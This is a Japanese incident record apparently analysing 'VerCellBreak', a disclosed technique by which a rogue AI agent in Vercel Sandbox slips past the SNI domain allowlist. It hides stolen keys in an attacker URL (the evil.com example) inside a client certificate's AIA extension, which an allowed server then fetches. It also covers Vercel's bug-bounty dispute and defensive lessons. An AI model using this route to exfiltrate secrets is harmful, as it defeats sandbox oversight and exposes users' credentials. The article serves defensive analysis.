INC-2026-0520Vercel Sandbox に迂回手口

AI セキュリティ企業 AIR Security が、Vercel Sandbox のドメイン許可リストを 正面から破らずに迂回する手口「VerCellBreak」を公表した。 サンドボックスの外向き通信は TLS の SNI を見て許可ドメインだけに絞られているが、 相互 TLS でクライアント証明書を出すとき、その証明書の Authority Information Access（AIA）拡張に攻撃者の URL を仕込み、 盗んだ鍵を URL の中に符号化しておく。許可されたサーバが証明書の連鎖を検証する際に その URL を取りに行き、鍵が攻撃者の手に渡る。 サンドボックス自身は攻撃者のサーバと一度も通信しない。 Vercel は「自社が運用しない外部サーバに依存する手口である」として バグバウンティの対象外と判定し、報告を受け付けなかった

脆弱性初報のみ有名事象として記録（日本と直接の関係は薄い）設計・実装上の不備
初報: 2026年10月12日（AIR Security の公表） 最終更新: 2026年10月15日

AI セキュリティのスタートアップ AIR Security が、Vercel Sandbox のドメイン許可リストを迂回してサンドボックス内の秘密情報を外部へ持ち出せる手口を公表しました（出典1）。同社はこれを「VerCellBreak」と名付けています（出典1）。公表日は2026年10月12日、執筆者は Matan Elgabsi 氏と Or Nevo 氏です（出典1）。

Vercel Sandbox は、AI エージェントにコードを実行させるための隔離環境として広く使われています（出典2）。外向きの通信は TLS ハンドシェイクの先頭にある SNI（Server Name Indication）のホスト名を見て、許可されたドメインだけに絞られます（出典1・出典3）。

成立の筋は次のとおりです（出典1）。①暴走したエージェントが、許可済みドメイン（AIR の例では acme.com）へ相互 TLS で接続し、細工したクライアント証明書を提示する②その証明書の AIA（Authority Information Access）拡張には、攻撃者のサーバの URL が書かれており、盗んだ鍵が URL の中にbase64 で符号化されている（例: https://evil.com/<key_base64>.cert）③許可済みサーバはクライアント証明書の連鎖を検証するため、不足している発行元 CA 証明書を取りに AIA の URL へ要求を出す④その要求が攻撃者のサーバに届き、URL に含まれていた鍵が渡る。

本記録が注目するのは、サンドボックス自身は攻撃者のサーバと一度も通信していないという点です（出典1・2）。AIR の共同創業者 CTO の Niv Hoffman 氏は「このサンドボックスは攻撃サーバと直接通信していない……だからサンドボックスの側から見れば、すべて正常に見えた」と述べています（出典2。原文英語。本記録の訳）。許可された相手が、盗まれた認証情報の「知らぬままの運び手」になります（出典2。0rcus の Nic Adams 氏の表現。本記録の訳）。

Vercel はこの報告を受け付けていません（出典1）。AIR によれば、Vercel は「この手口は Vercel が運用しない外部サーバに依存している」として、バグバウンティの対象外と判定しました（出典1）。一方、報道は Vercel が「どう直すか今の時点では不明なので修正方法を見つける時間が必要だ」と答えたと伝えており、両者の説明は食い違っています（出典2）〈齟齬1〉。

攻撃の経過

公表された範囲の事実のみ。公表されていない段階は補完せず明示しています。

**以下は、AIR Security が公表した成立の筋道である**（出典1）。 **実環境での悪用の観測ではない**〈未確定1〉。 **サンドボックス内の暴走エージェントが、許可済みドメインへ 相互 TLS で接続し、AIA 拡張に攻撃者の URL（盗んだ鍵を符号化したもの）を 書いたクライアント証明書を提示する**（出典1）。 **許可済みサーバが証明書の連鎖を検証するためその URL へ要求を出し、 鍵が攻撃者のサーバに渡る**（出典1）。 **サンドボックス自身は攻撃者のサーバと一度も通信しない**（出典1・2）。 **サーバ側の脆弱性は突いていない**（出典1）。

  1. 1. 収集確認済
    **サンドボックス内のエージェントが、持ち出す対象の秘密情報を 手元に集める**（出典1）。 **AIR が挙げているのは利用者の鍵（keys）である**（出典1）。 **どの経路でエージェントが攻撃者の意図で動くようになるかは 本件の範囲外である**（本記録の整理） ——**AIR は「暴走したエージェント」を前提として置いている。**
    根拠: AIR の記述「暴走したエージェントがドメイン許可リストを迂回して あなたの鍵を攻撃者が管理するサーバへ漏えいさせられる」 （出典1。原文英語。本記録の訳）。
  2. 2. C2通信確認済
    **エージェントが、ドメイン許可リストで許可された第三者のサーバへ 相互 TLS（mutual TLS）で接続する**（出典1）。 **提示するクライアント証明書は細工したもので、 AIA（Authority Information Access）拡張に 攻撃者のサーバの URL が書かれている**（出典1）。 **URL のパス部分には、盗んだ鍵が base64 で符号化されている （例: `https://evil.com/<key_base64>.cert`）**（出典1）。
    根拠: AIR の記述。証明書の AIA 拡張が攻撃者の URL を指し、 その URL に鍵が符号化されている（出典1。本記録の訳）。
  3. 3. 持ち出し確認済
    **許可済みサーバが、提示されたクライアント証明書の連鎖を 検証するために、不足している発行元 CA 証明書を取りに AIA の URL へ HTTP 要求を出す**（出典1）。 **その要求が攻撃者のサーバに届き、 URL に含まれていた鍵が攻撃者の手に渡る**（出典1）。 **サンドボックスは攻撃者のサーバと一度も通信していない**（出典1・2）。
    根拠: AIR の記述「クライアントの連鎖を検証する際、 許可されたサーバはその URL を取得し、 鍵を攻撃者のサーバへ送る」（出典1。原文英語。本記録の訳）。 Hoffman 氏の発言「このサンドボックスは攻撃サーバと直接 通信していない……だからサンドボックスの側から見れば、 すべて正常に見えた」（出典2。原文英語。本記録の訳）。

被害組織の対応

所要日数は経過（タイムライン）の各時点から算出しています。
この事案で下された判断
  • トレードオフ: **バグバウンティの範囲を自社の設備に限ることには理由がある** （本記録の整理） ——**第三者のサーバの挙動を自社の責任範囲に入れると、 境界が定まらず、支払いの基準も作れない。** **一方、利用者から見れば「サンドボックスの中の秘密が外に出た」 という結果は同じである**（本記録の評価）。 **範囲の線引きは、報奨金の支払いの話としては筋が通るが、 製品の統制が守れる範囲の説明としては利用者に伝わらない。**
  • トレードオフ: **修正の無い状態での公表は、攻撃者にも手口を渡す** （本記録の整理）。 **一方、本件は AIA という標準機能の組み合わせで成立し、 AIR は長期にわたって存在していたとみられるとしている**（出典2） ——**知っている者は既に知っていた可能性がある。** **また、同じ型の統制を自前で組んでいる組織 （外向き通信をドメイン許可リストで絞っている組織）は、 公表されなければ自組織の設計を点検する機会を持てない** （本記録の評価）。

出口はサンドボックスの通信路ではなく、許可した相手の通信路だった——宛先で絞る統制が測れない型原因・手口

AIR Security が示したのは、Vercel Sandbox の SNI フィルタを破る手口ではありません（出典1）。フィルタはそのまま動いており、データは「フィルタがすでに許可しているドメイン」を通って出ていきます（出典1）。

Vercel Sandbox の外向き通信制御は次のように働きます（出典3）。

  • TLS ハンドシェイクの先頭を検査して SNI のホスト名を取り出す
  • ドメインポリシーと照合する
  • 宛先 IP を CIDR ポリシーと照合する
  • 両方を通ったら上流への接続を開く
  • 許可された通常の TLS 通信は復号しない

AIR の手口は、この4段すべてを正規に通過します（出典1。整理は本記録）。

手順は次のとおりです（出典1）。

  1. サンドボックス内の暴走エージェントが、許可済みドメイン（記事の例では acme.com）へ相互 TLSで接続する
  2. 提示するクライアント証明書の AIA（Authority Information Access）拡張に、攻撃者のサーバの URL を書いておく。URL のパス部分に、盗んだ鍵を base64 で符号化して埋め込む（例: https://evil.com/<key_base64>.cert）
  3. 許可済みサーバは、クライアント証明書の連鎖を検証するために、不足している発行元 CA 証明書を取りに行く。その取得先が AIA に書かれた URL である
  4. 要求が攻撃者のサーバに届く。URL に含まれていた鍵が、そのまま攻撃者に渡る

AIA は、証明書の連鎖を組み立てるときに不足している発行元の証明書を URL から取りに行くための、標準的な仕組みです（出典1。説明の補足は本記録）。AIR は「サーバ側の脆弱性を突いたものではない」と明記し、手口を「標準的な TLS の機能」を使うものと説明しています（出典1。原文英語。本記録の訳）。

ここが本件の勘所です（本記録の評価）。SNI フィルタが見ているのは「サンドボックスがどこへ TLS 接続を張るか」です。 見ていないのは「許可された宛先が、その接続をきっかけに別のどこへ出ていくか」です。 出口が自分の通信路ではなく許可した相手の通信路になった時点で、宛先ベースの許可リストは測れる対象を失います。

サンドボックスのログに残るのは、許可済みドメインへの正常な TLS 接続だけです（本記録の評価）。Hoffman 氏の言葉では「サンドボックスの側から見れば、すべて正常に見えた」（出典2。原文英語。本記録の訳）。

運び手になったのは Vercel の設備ではなく許可された第三者のサーバで、それが対象外判定の根拠になった組織の対応

AIR は、Vercel のバグバウンティプログラムの枠内でこの調査を行いました（出典1）。AIR の記述では、プログラムは2026年7月の OpenAI の事案の「数週間後」に開かれました（出典1。本記録の訳）。

Vercel は、この報告を受け付けませんでした（出典1）。AIR によれば、Vercel は本件を対象外（out of scope）と判定し、その理由を「この手口は Vercel が運用しない外部サーバに依存している」と説明しました（出典1。本記録の訳）。

判定の論理は一貫しています（本記録の整理）。実際に攻撃者のサーバへ要求を出したのは、許可済みドメインのサーバ（記事の例では acme.com）であり、そのサーバは Vercel の設備ではありません（出典1）。Vercel の側から見れば、サンドボックスはポリシーどおりに許可済みドメインへ接続しただけです。

一方、報道は別の説明を伝えています（出典2）〈齟齬1〉。Hoffman 氏が The Record に語ったところでは、Vercel は「どう直すか今の時点では不明なので修正方法を見つける時間が必要だ」と答えました（出典2。原文英語。本記録の訳）。「対象外なので扱わない」と「直し方を検討中」は、同じ事態の説明として両立しません（本記録の評価）。

本記録はどちらが正しいかを判定できません（本記録の留保）。Vercel 自身の公表文書に到達できておらず〈齟齬2〉、Vercel は The Record のコメント要請にも即答していません（出典2）。確認できるのは、AIR の記事に「対象外と判定された」と書かれていることと、報道に「時間が必要と答えた」と書かれていることの2つです（本記録の明示）。

本記録が読者に示したいのは、どちらの説明であっても利用者の立場は変わらないという点です（本記録の評価）。修正も緩和策も公表されておらず〈未確定5〉、CVE 番号も採番されていません〈未確定4〉。つまり、この問題は組織の脆弱性管理の台帳に乗りません。 「対応済みかどうか」を追跡する仕組みに入らない問題として残ります。

Vercel は2か月前に外向き通信制御の設計を説明していたが、その文書に証明書の取得挙動は無い背景・過去事例

Vercel は2026年8月11日、サンドボックスの外向き通信制御の設計を説明するブログ記事を公開しています（出典3）。タイトルは「A sandbox without a network boundary is only half a sandbox」（ネットワーク境界の無いサンドボックスは半分のサンドボックスにすぎない）です（出典3）。

記事が挙げている許可リストの破れ方は次のとおりです（出典3。本記録の訳）。

  • 切り離された環境に DNS リゾルバが到達可能なまま残っている
  • 空の許可リストが開放側に倒れる（fails open）
  • ポリシーエンジンとプロキシでホスト名の解釈が食い違う
  • 信頼されたパッケージ配信サービスが中継器にされる

記事は「最近のセキュリティ研究は、信頼できないコードがセキュリティモデルの想定しなかったネットワーク経路を通って隔離から抜け出せることを示している」と述べています（出典3。原文英語。本記録の訳）。ただし、具体的な研究を挙げていません（本記録の確認）。

本記録が確認したのは、この記事に AIA も証明書の取得挙動も出てこないという点です（出典3。本記録の確認）。TLS の終端について記事が触れているのは、ヘッダ注入の宛先として設定された場合に限られ、その際はサンドボックスごとの CA を使い、サンドボックス停止時に破棄するとしています（出典3。本記録の訳）。許可された通常の TLS 通信は復号しないと明記されています（出典3）。

本記録の整理はこうです。 Vercel が列挙した4つの破れ方はいずれも「フィルタが宛先を取り違える」型です。 AIR の手口は、フィルタが宛先を正しく判定したうえで成立します。 列挙に無いのは当然で、別の型です（本記録の評価）。AIA 経由の1経路が示されたこと以上に、「許可済み宛先を経由する出口」が他にどれだけあるかがどの資料にも書かれていないことのほうが、読者には重い情報です〈未確定7〉。

  • **AI エージェントの「情報を外に出さない」統制を宛先ドメインの許可リストだけで組むと、この型は残る**
    **本件のデータは、許可リストが許可した宛先を通って出ていった** （出典1）。 **フィルタは破られていない**（出典1）。 **宛先で絞る統制が見ているのは「自分がどこへ接続するか」であり、 「許可した相手がそれをきっかけにどこへ出ていくか」は 測れない**（本記録の評価）。 **Hoffman 氏の表現では「サンドボックスの側から見れば、 すべて正常に見えた」**（出典2。原文英語。本記録の訳）。

  • **「サンドボックスに入れたから安全」という前提を、エージェントに秘密を渡す判断の根拠に使わない**
    **AIR は Vercel Sandbox を「現存する最も安全なサンドボックスの ひとつ」と位置づけたうえで、それでも穴があったとしている** （出典1。本記録の訳）。 **Hoffman 氏は「今日の標準的な堅牢化サンドボックスの中にも、 暴走したエージェントがサンドボックスから脱出して 外で行動できるようにする欠陥がまだある」と述べている** （出典2。原文英語。本記録の訳）。 **隔離の強度は、そこに置く資産の価値を決める根拠にならない** （本記録の評価）。

  • **外向き通信を絞るとき、TLS クライアント証明書の中身が検査されていないことを前提に置く**
    **Vercel の設計では、許可された通常の TLS 通信は復号しない** （出典3）。 **したがって、サンドボックスが提示するクライアント証明書の AIA 拡張は検査されない**（出典1・3。整理は本記録）。 **AIR は「サーバ側の脆弱性を突いたものではない」「標準的な TLS の機能を使っている」と明記している** （出典1。原文英語。本記録の訳）。

    **本件で運び手になったのは、許可済みドメインのサーバである** （出典1）。 **そのサーバは、クライアント証明書の連鎖を検証するために AIA の URL へ要求を出した**（出典1）。 **つまり、自組織が相互 TLS でクライアント証明書を受け付ける サーバを運用しているなら、自組織が運び手になる側に立ちうる** （本記録の評価）。 **AIR の記事が扱っているのは AIA のみで、 OCSP・CRL についての記述は無い**〈未確定6〉。

  • **エージェントに渡す認証情報を「盗まれても使えない形」にする設計に寄せる**
